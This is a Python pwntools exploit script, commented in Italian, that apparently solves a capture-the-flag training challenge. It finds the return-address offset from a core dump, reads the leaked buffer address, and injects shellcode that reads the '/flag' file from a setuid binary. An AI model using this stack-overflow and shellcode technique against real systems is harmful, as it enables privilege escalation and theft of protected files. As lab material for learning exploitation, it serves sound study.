#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --
Con questo programma si vuole: 
 + Individuare la dimensione del buffer e il suo indirizzo di partenza;
 + Costruire uno shellcode per l'operazione che si vuole far eseguire alla macchina vittima; 
 + Inviare un bytestream contenente lo shellcode (che verrà inserito nel buffer), seguito da
   un padding per raggiungere il return address e l'indirizzo del buffer che sostituirà
   il return address della funzione.
=> In questo modo la funzione, quando terminerà, andrà a eseguire lo shellcode malevolo.
-----------------------------
'''

# Impostazione dell'architettura di riferimento e del livello di log
context.log_level = 'CRITICAL'
context.arch = 'amd64'

# File binario da eseguire
elf = ELF('/challenge/toddlerone-level-2-0')

# =========================================================== #
# =========================================================== #
# =========================================================== #

# Avvio del processo con 'setuid = false' per generare il memory core dump 
p_dump = elf.process(setuid=False)

# Invio di una cyclic string per far crashare il processo e ottenere il memory core dump 
p_dump.sendline(b'512')
p_dump.sendline(cyclic(512, n=8)) # n = 8 (byte) per la dimensione degli indirizzi
p_dump.wait()

# Uso del memory core dump generato per calcolare la dimensione del buffer
core_dump = p_dump.corefile.fault_addr
delta_len = cyclic_find(core_dump, n=8)
print(f'\nDistanza tra buffer e return address: {delta_len}\n')

# =========================================================== #
# =========================================================== #
# =========================================================== #

# Avvio del processo con 'setuid = true'
p = elf.process()

# Lettura dell'indirizzo di inizio del buffer
p.recvuntil(b'The input buffer begins at 0x')
addr = p.recvuntil(b',').decode()[:-1]
print(f'Indirizzo del buffer: 0x{addr}\n')
buffer_addr = p64(int(addr, 16)) # p64 = trasformazione in byte

# Creazione dello shellcode
assembly = shellcraft.cat('/flag')
shellcode = asm(assembly)

# Preparazione del bytestream
padding = b'A' * (delta_len - len(shellcode)) # Creazione del padding tra lo shellcode e il return address
bytestream = shellcode + padding + buffer_addr

# Interazione con il processo e invio del bytestream
p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)
p.interactive()
